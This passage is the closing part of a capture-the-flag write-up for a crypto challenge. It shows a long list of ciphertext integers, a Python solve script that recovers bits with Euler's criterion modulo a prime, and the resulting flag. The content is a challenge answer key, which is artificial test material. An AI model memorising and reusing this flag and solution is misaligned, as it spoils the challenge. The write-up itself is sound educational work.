9122428024434962902595132465707738388892318405258337198964284798807832111183, 45219015459930012381528100022109703929142328005565688519969281228478587025156, 37937438320920938080194998531655411538645397488518809263576468548095334941049, 65463191167111256133850830561950011602415787482391546687108828852078336346911, 60267390775769712809243637108005516372054896996335986578776656061913988505380, 31187280205923216765025642712731268538092737496945912665477089963549936661000, 39272203117676991849401256050052660389252891090765421072850812790511853633553, 78650399942810180369166637327220488673491469759016027310017260378395192153917, 63679779865600882115457578102137190521431770150485077494234497317040310556099, 94197711842546391399936480688526532205484253031969515698149700461481218435503, 55426351612657722347952609331927607250320193708145787272479883713911328260171, 94579488448780631031570551761117560463614768969716618208863957906602543864256, 42533211515825827897607197697818367567724897911870487437227525480798959030736, 71817193990486711499448836892334029689594769863757209290780334731796075040964, 49582582372627092919996673631156116915578095143759344425462558619751837756115, 16778862498079304970130684233228282291061728198209025400841438773809486045439, 14720766794414702326013223598332514689730269727677755351121759524459792723815, 91823179796422607777458789555431412361727477658725342545633205873539390524421, 12694496938346057655349578497630025226490487986396361007943957007999746501758, 73256087035268026678251823321714291938230083291400455643716217526282587453490, 82067053864614955720331353764077356749839546969350079359806989229896280871639, 2294214511684098951448895697206660875590100097765398000960427914742478567468, 94996367172467362549072804695542787589471757112709399248918663083637674875430, 59474972193189900872036261980527256847598779519129004892669760035949359596606, 41485046826485366939559105778182279178776733141732587039714077484707517673414, 30412373303809291358251419626484743728420797010128289787459320584456794477728, 16757273319641017346460609339812262074112156687285784823742352746685264992379, 14153394449089890608134311960881667677866890754276351688174647355758384644208, 35267312148665588028133403157437977272702217909940645971373606689401454239924, 25465572937315970004671485436432326847481734301701086900680247656344895637489, 91772640899291600179884634716699977518176166265177845979210905419023385427169, 21202239116914803055046359653747295796716387504506260166689961462743702888272, 38004169931088542628056717769207753056395024570208499914119987227199372776609, 90200388178027170845901671405926529885003050744671942306854133475369592255284, 67103463297019868103506162494808639910142863443197903858998004329088015085523, 63711271696919572850260563707814751558803656037405411887337920717563822065752, 77668043054392826789311460278906027367647248204625519502878680145405861209190, 44569139842369210610100977433213151422864959112673084241197625375177236769097, 58443888034627936323756326700272770246863224271563209128177317645955486143403, 80851036613437865066354537941959631305841498627989280039977583470550685884031, 9021753887527487436199159854975234579459170761210967112439040341901658426878, 84387698184222592645514926620408729191662827277136602275202779173241313177512, 29589066716928530039314971637335850646071216993197616270416702240213988708218, 64726951774614639011075770690988313459581285735819050256715848241230131038358, 30500821175393449650880839482563016060280355078274606393428875534120413692351, 52518903414921155720607415198610600547400377020270396066959711966325275416218, 23587780722750722770275831382258422302869745535367947800297505821028954037171, 33414084368227213965052202768373969326135601029670262014942312319657066989279, 67712235194933598828927102315642664823927554129129073489793529336688516628376, 44555037196293370995200765960065412645438350638060651696204475599201076709237, 73006002456940502435655404506315494322512733852942509890976346775163427165310, 62703204333859958106441079329987788867826810342083200718161524691314631366192, 41360739245070421742301640606287372301286012210246939265330115507136267210529, 21524966058106637889690861152062902783679249838848325868661667338362305512605, 43553249569815730507179981484772699321159546492004250922181426029453077920079, 14297444443172990665307586017069954404946684905826170950127732631547063239665, 24801649245070520747846216461134075637301799914670831528569224459302974479910, 71792950629879690389862969053832052341534509142032062883899129973901240720300, 48990800423597725830976475702202144208371799233843252282437888550703983177871,
58932401176503301188939484670758239439029400910940273819954708091952185128101, 29805329545570657187061054277681037842386998505222318319869493263184453237335, 15021531307879623848342180806906885935426313848470834110190625625842603446892, 68301407971708771621955668309504704919448633895470419327248228378437371071707, 9041464349332920322053492322397467090982581639189634512821125823846406612686, 11645745705922740709992328444030957451421417877718952690532310638657049342012, 51519900725182834651012610242386227837010938922312446801520177957974712078733, 44072901569695371905510566384412886394954631489325181572552132004876471926263, 2606048910031069923678310129611989877756680559818904877334463917523219457609, 75753391664218975184134365440412662853259852104152712468951238127372145976339, 15480514194144494756165942191551223126468735462611235289028554445294653717141, 19907633778461246967896664600495182499389474055142800242657274675739166803459, 89286628534912356047272665197390938286813366717592767552269206113618450939987, 27724319524510901684103616013027701443212064913957198385891885446777643746947, 38770117147346725679667410493958876599763936741087731663850249509589239785493, 65213064141729790434518900170350221145766268290137703560118563019872038545472, 25704540471861897687747270141706366995654183460471840204494658897334997899410, 65353972147881189621914437255471747539197260946549775695445665481738514018425, 36069772255465284610802002597370753632135897350479023749362126239947236277675, 18809654537942067000907702507841673030325079244794968097216484489611489035106, 3867306407828405923822343829963635592400348330249025324186683001404658494180, 73678870136284092359610021648501635899427042366666265069949512488413523159725, 48478244667566777439295217098581533365776702109187818027699849083490521359726, 84005115144173955512866423834950812997259510339179151333292546017897718331217, 37533207779115588974731425824672500768814451827290604489403885903799278408109, 62520882892756925687378853000041503608165019098415708109035365448936067075407, 85499048737699394218744193752544278618630199679756107562869131518958092363862, 95166408910762550632514932625225255516360966186280552697059772790259563372320, 37462475664148421034992033218613706530522104818289591891751450118252831347609, 94508256013291571790243986375559184516307754290264521542077092405054083703796, 65575664767021919088218400821682212721218608241034982140920541997560959832078, 69796871204916953128744037044487475274812991800348514457981101256036613662450, 71123466069972860915641815812956297172446932814780863255421860347745339199629, 63059270582688428236713604360977756712949795939221234541977720634978042557479, 2895225665369795341321356875129343263397212618538040274487630324221756395495, 65566307731462140194389734325472877491172365995570187411331075306139762031691, 67495500086827763496189943427683723468094947513106020864296576416747386551624, 47327207060445198242643423041825971662581649032249539703427514503618193886073, 63204694409902426108355501692976612908254464638403016377958775376484463511135, 58678775008860624636119162877531161014718979482142182771573146907326391425717, 95044055427287512366276936777264478827232704338437414982679688810793641069496, 82831529119748071029058540358860696342778528562238155536059617869845912700645, 43861224659586250512358671261916534919565134804576376429874826957318740209391, 65566917866614326229674768694805290458186567484087989784979570783651032452878, 38244169424037873706697845015870038778906775351079489415332867905622651749809, 960399506344712151036004621994096547805426885129053793447354781928718828195, 5817124209012913179571296814083271647384848077852052426002263275626218345025, 70843959224405026070085178283269324817986855784912640735177226071183254884180, 78893743676398216527680939638758475458781793761483387360338397232407930725502, 80085810695337939133588773854239299711553039209380726603692605277411409303966, 77251365454813869055486641660028450494651325862988383334727321218418560985376, 3251943778803976711286061838768710050216271276434532906629466523146190977265, 92459083556560234338584648642953484041505603211400792226006167449071904938087, 41315404555636554566353045264784979438558322501883993961664043314479122030982, 33667921732374812293555545145317542830269138082203394549564420337563511193264, 50621317952967079741222119913032402394225411815446734158547018570454283770610, 61538555407587216288628161469598279569212468026569037020569554472277505867860, 39606381801095228171182252714963949195391349029446098094433836311947366748974, 17953182036365687621683574841421811357208731161754128420243424237624005507292, 6190971254605091232451529905747605417656775783024123539018809172451881761215, 24900864704471553434195010048955554593325138038080996664735907228770196880560, 10543195327397254020284310322430207644894242960895519587035695647412134999016, 47924531000639762023673307267122638007581576823068862921870896068866633394171, 19608471008911567550722544831800884194350927182490432232297048805561567190068, 73186293738418227162466985240965059382406888048823737842292990865577384260402, 46543617838237527608676169663642406675114888125078816251773853670035125668327, 10887521163982995742665591212887572254641573865819852321227254297463369378757, 95864064768743007099114077501237604640804188923396179519872005842740443029053, 93491158725857563983450270953464865480053052171181924427857859244709726666071, 66825162565490641340913352156970328411699085617818733870637467906069035138441, 88654055348896157513190254742817045113247315845423358391652859909742319633366, 77111213038828555934590491117487574876536940586374816487888235710362552865868, 26678676680954697758157596968058851948710733628229767222823914638197415347290, 45274196742261399015310184050782710721838593098302997420730602792248829914662, 11127057880291193918266637875818674553751410261869322342628348401264220296286, 93462971473448293984429493262651106641176064756281135412131328283064855378988, 90302791214563481426594767957092003195180657420583244979056724424177116030853, 15313848593678085835799518445701439801201857788077887972051482039480548393637, 28614362238386344451433803011769862093332477963804536169743753131346648335975, 96491672177543312015480691847973658772711259385679857934718873155088408055046, 42301694889548951016246284894329404464594688959616187013899635091103337836717, 46353007060252533455483227916744905299151183342666007163476701567951253528736, 79839703062477374459886524392435098801822289144847449478702368595623902987680, 46783400551087333523958538798205546101411729752062735369103520262740178438753, 56872651091298734129449461270914178234764299121906396309921602466898140304365, 55345094401475685162234185361328679014862432225300545395490433120615543516349, 71857988633674287131692935982565878924171301998834033964230950051788343943421, 73397553618456249814488665236594681860325090363523487802693708209869330880507, 91273817268449052212505869236740446096003331079462740258133485266870552861006, 41125713977491932720809445466298017068859216103887924591071386105259166186610, 10976272927609182135453062171314099889424242502585646696510784536426947241849, 74833007251806404834992968420737342446360952912467741893229250823477851895274, 38783541642734736023791760201077416997507081321013703558508973853069710934783, 84248864059313265407718358918343928748160949336813609666210932674632143654824, 82602002119241454477141450021218821487564602836760639860648023592499587185856, 89819647896782114807682181082759429437661708787869659336592879965813906997708, 23947255344454489668491857346046788876253021175185681444747952805430910288653, 45079677286325826130627514645496230345783737235639911042111222603703961525471, 31422315820021970621139404712399912221539882071460492381363799041483199779170, 78319051979712454760132140327765937454261888111097632383458050081958251932718, 13195058600578339298317331174447828396628584821721804422117397583118862095468, 76331308821686112269980476446767367482076206695320817648912917023040484744371, 85170210949791075377874335436657985171655895727142420005420448205376733873316, 82555492183656104712338936014903798922258809238013067932914827160603637621174, 12853005456280472788501210198110293457770020153015023657261972261311335921418, 54248544836879684654909756290276457357272919419446162758946246806760522100711, 87867368966726802666208924336758462717985240907205754302063242165609320760427, 73987307448912593135218860198268250462112582891066381555467243973016617080097, 62034957522597381807235151354312171918753368363851082317347374304031679600835, 71522279909103982493300281091673068587691535938891602681331258161179646018191, 47335993876757842828698766773477345247204614564806619542087825435513112987645, 48773159050572757429890800098259949250072566477582372396422636674323769400104, 31226180332173013494837685738648368082411434224960692624560991892476408389960, 59749707224753370726933899896607122727427655755816079818836748123403303618382, 13766045506333347863667381014672985531647803309594301027648194094171298738229, 90335253544133308792500347574392037813202491123760375294542737540752624583995, 95170606184823264968832958138783311990043706962099995010700617639475230600727, 55404200670899879712624286794610841624897767385622505408175747048711395105465]

# Given prime p and base a
p = 96517490730367252566551196176049957092195411726055764912412605750547823858339
a = 1337

in_bins = ""

for i in encrypt:
    if pow(i, (p-1)//2, p) == 1:
        in_bins += "0"
    else:
        in_bins += "1"
print(long_to_bytes(int(in_bins, 2)))
```

And we get the flag.

```python
└─$ python3 solve.py
b'OSCTF{d0_y0U_L0v3_m47H_?_<3}'
```

Flag: `OSCTF{d0_y0U_L0v3_m47H_?_<3}`
